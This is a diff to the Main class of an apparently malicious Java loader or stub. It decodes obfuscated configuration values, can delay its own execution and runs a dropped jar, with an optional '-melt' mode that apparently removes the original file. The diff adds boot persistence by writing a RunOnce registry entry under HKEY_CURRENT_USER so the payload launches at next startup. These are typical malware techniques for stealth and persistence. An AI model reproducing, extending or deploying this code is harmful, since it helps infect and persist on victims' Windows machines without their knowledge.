@@ -53,6 +53,8 @@ public class Main {
 			if (decode(keyArgs[7]).equalsIgnoreCase("true")) {
 				Thread.sleep(Long.parseLong(decode(keyArgs[8])));
 			}
+			
+			boolean runNextBoot = Boolean.parseBoolean(keyArgs[10]);
 
 			if (System.getProperty("os.name").toLowerCase().contains("win") && Main.class.getResourceAsStream("/host.dat") != null) {
 				try {
@@ -181,11 +183,18 @@ public class Main {
 			}
 
 			if (System.getProperty("os.name").toLowerCase().contains("win")) {
-				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
-					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "-melt", mepath });
+				boolean melt = Boolean.parseBoolean(decode(keyArgs[2].trim()));
+				
+				String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
+
+				if (runNextBoot) {
+					WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Java", "\"" + javapath + "\" -jar \"" + file.getAbsolutePath() + "\"" + (melt ? " -melt" : ""));
 				} else {
-					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
+					if (melt) {
+						Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "-melt", mepath });
+					} else {
+						Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
+					}
 				}
 			} else {
 				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
